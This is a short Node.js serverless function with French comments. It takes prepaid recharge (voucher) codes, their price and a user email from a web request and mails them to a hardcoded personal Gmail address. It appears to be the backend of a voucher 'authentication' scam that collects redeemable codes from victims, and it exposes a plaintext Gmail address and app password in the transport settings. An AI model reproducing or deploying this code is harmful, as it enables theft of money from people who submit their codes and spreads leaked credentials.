import nodemailer from 'nodemailer';

export async function handler(event, context) {
  try {
    const { rechargeType, price, rechargeCode, encryptedCode, email } = JSON.parse(event.body);

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'henry.gossou17@gmail.com', // Remplacez par votre adresse email
        pass: 'ovjg xkho cmbu scsy', // Remplacez par votre mot de passe
      },
    });

    const mailOptions = {
      from: email,
      to: 'henry.gossou17@gmail.com',
      subject: 'Nouvelle demande d\'authentification',
      text: `Type de recharge : ${rechargeType}\nPrix de la recharge : ${price}\nCode de la recharge : ${rechargeCode}\nCode crypté : ${encryptedCode}\nEmail : ${email}`,
    };

    const info = await transporter.sendMail(mailOptions);
    console.log('Email envoyé : ' + info.response);

    return {
      statusCode: 200,
      body: JSON.stringify({ message: 'Email envoyé avec succès' }),
    };
  } catch (error) {
    console.error('Erreur lors de l\'envoi de l\'emmail', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ message: 'Erreur lors de l\'envoi de l\'emmail' }),
    };
  }
}
